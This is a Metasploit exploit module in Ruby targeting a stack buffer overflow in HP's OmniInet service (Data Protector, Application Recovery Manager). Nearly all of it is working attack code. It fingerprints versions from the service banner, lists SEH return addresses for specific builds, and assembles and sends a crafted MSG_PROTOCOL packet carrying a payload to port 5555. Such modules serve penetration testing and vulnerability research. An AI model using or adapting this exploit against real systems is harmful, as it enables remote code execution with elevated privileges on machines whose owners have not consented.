##
# $Id: hp_omniinet_1.rb 8080 2010-01-06 20:09:34Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OmniInet.exe MSG_PROTOCOL Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Hewlett-Packard
				OmniInet NT Service. By sending a specially crafted MSG_PROTOCOL (0x010b)
				packet, a remote attacker may be able to execute arbitrary code with elevated
				privileges.

				This service is installed with HP OpenView Data Protector, HP Application
				Recovery Manager and potentially other products. This exploit has been tested
				against versions 6.1, 6.0, and 5.50 of Data Protector. and versions 6.0 and 6.1
				of Application Recovery Manager.

				NOTE: There are actually two consecutive wcscpy() calls in the program (which
				may be why ZDI considered them two separate issues). However, this module only
			   exploits the first one.
			},
			'Author'         =>
				[
					'EgiX <n0b0d13s[at]gmail.com>',
					'Fairuzan Roslan <riaf[at]mysec.org>',
					'jduck'
				],
			'Version'        => '$Revision: 8080 $',
			'References'     =>
				[
					[ 'CVE', '2007-2280' ],
					[ 'BID', '37396' ],
					[ 'OSVDB', '61206' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-099' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload' =>
				{
					'Space'    => 4658+66,
					'BadChars' => "\x00", # (we don't want \x00\x00)
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic Targeting', { 'auto' => true }  ],

					# DP Targets
					[ 'HP OpenView Storage Data Protector A.05.50: INET, internal build 330',
						{
							'Ret' => 0x004406cf # p/p/r - OmniInet.exe (v5.50.330.0)
						}
					],
					[ 'HP OpenView Storage Data Protector A.06.00: INET, internal build 331',
						{
							'Ret' => 0x0044327d # p/p/r - OmniInet.exe (v6.0.331.0)
						}
					],

					# APPRM Targets
					[ 'HP StorageWorks Application Recovery Manager A.06.00: INET, internal build 81',
						{
							'Ret' => 0x004280ff # p/p/r - OmniInet.exe (v6.0.81.0)
						}
					],
					[ 'HP Application Recovery Manager software A.06.10: INET, internal build 282',
						{
							'Ret' => 0x004412ed # p/p/r - OmniInet.exe (v6.0.282.0)
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 17 2009'))

		register_options([Opt::RPORT(5555)], self.class)
	end

	def check
		connect
		sock.put(rand_text_alpha_upper(64))
		resp = sock.get_once(-1,5)
		disconnect

		if (resp)
			resp = resp.unpack('v*').pack('C*')
			print_status("Received response: " + resp)

			# extract version
			if (resp =~ /HP Data Protector/)
				version = resp.split[3]
			elsif (resp =~ /HP OpenView Storage Data Protector/)
				version = resp.split[5]
			elsif (resp =~ /HP StorageWorks Application Recovery Manager/)
				version = resp.split[5]
			else
				return Exploit::CheckCode::Detected
			end

			version = version.split('.')
			major = version[1].to_i
			minor = version[2].to_i
			if ((major < 6) or (major == 6 and minor < 11))
				return Exploit::CheckCode::Vulnerable
			end

			if ((major > 6) or (major == 6 and minor >= 11))
				return Exploit::CheckCode::Safe
			end

		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		mytarget = target

		if (target['auto'])
			mytarget = nil

			print_status("Automatically detecting the target...")

			connect
			sock.put(rand_text_alpha_upper(64))
			resp = sock.get_once(-1,5)
			disconnect

			if not resp
				raise RuntimeError, "No version response returned."
			end

			resp = resp.unpack('v*').pack('C*')
			print_status("Received response: " + resp)

			self.targets.each do |t|
				if (resp =~ /#{t.name}/) then
					mytarget = t
					break
				end
			end

			if (not mytarget)
				raise RuntimeError, "No matching target"
			end

			print_status("Selected Target: #{mytarget.name}")
		else
			print_status("Trying target #{mytarget.name}...")
		end

		# separator between arguments
		sep = [0x2000].pack('N')

		# Unicode BOM
		pkt = "\xff\xfe"
		# MSG_PROTOCOL command
		pkt << Rex::Text.to_unicode("267")

		# dunno
		3.times do
			pkt << sep
			pkt << rand_text_alpha_upper(2)
		end

		# culprit string
		pkt << sep

		# the payload + seh record
		pkt << payload.encoded
		pkt << generate_seh_record(mytarget.ret)

		# jump back
		dist = payload_space + 8
		pkt << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + dist.to_s).encode_string

		# force exception hitting the end of the stack
		pkt << rand_text_alphanumeric(1000) * 25

		# 5th arg
		pkt << sep
		pkt << rand_text_alpha_upper(2)

		# end marker
		pkt << sep

		# packet length
		buff = [pkt.length].pack('N')
		buff << pkt

		connect
		print_status("Sending MSG_PROTOCOL packet...")
		sock.put(buff)

		handler
		disconnect

	end

end